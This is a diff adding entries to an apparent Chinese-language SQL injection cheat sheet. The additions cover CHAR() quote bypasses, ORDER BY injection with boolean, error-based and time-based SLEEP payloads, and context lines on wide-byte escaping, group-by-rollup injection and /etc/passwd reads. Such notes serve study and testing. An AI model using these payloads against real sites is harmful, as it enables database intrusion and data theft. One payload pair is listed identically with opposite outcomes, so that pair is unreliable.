@@ -354,6 +354,9 @@ cat $(ls)
     - `char(65) => 'a'`
 - Concatenation
     - `CONCAT('a', 'b') => 'ab'`
+        - 如果任何一欄為NULL，則返回NULL
+    - `CONCAT_WS(分隔符, 字串1, 字串2...)`
+        - `CONCAT_WS('@', 'gg', 'inin')` => `gg@inin`
 - Cast function
     - `CAST('125e342.83' AS signed) => 125`
     - `CONVERT('23',SIGNED) => 23`
@@ -389,6 +392,8 @@ cat $(ls)
         - /etc/passwd
     - 可繞過一些WAF
         - e.g. 用在不能使用單引號時(`'` => `\'`)
+         - CHAR()也可以達到類似效果
+             - `'admin'` => `CHAR(97, 100, 109, 105, 110)`
 - 註解：
     - `#`
     - `--`
@@ -504,6 +509,22 @@ cat $(ls)
         - 但要低位範圍有包含`0x5c`(`\`)
     - 第一個Byte要>128才是中文
     - `%df'` => `%df\'` => `運'` (成功逃逸)
+
+- Order by注入
+    - 可以透過`asc`、`desc`簡單判斷
+        - `?sort=1 asc`
+        - `?sort=1 desc`
+    - 後面不能接UNION
+    - 已知字段名 (可以盲注)
+        - `?order=IF(1=1, username, password)`
+    - 利用報錯
+        - `?order=IF(1=1,1,(select 1 union select 2))` 正確
+        - `?order=IF(1=1,1,(select 1 union select 2))` 錯誤
+        - `?order=IF(1=1,1,(select 1 from information_schema.tables))` 正常
+        - `?order=IF(1=2,1,(select 1 from information_schema.tables))` 錯誤
+    - Time Based
+        - `?order=if(1=1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test))` 正常
+        - `?order=if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test))` sleep 2秒
 
 - group by with rollup
     - `' or 1=1 group by pwd with rollup limit 1 offset 2#`
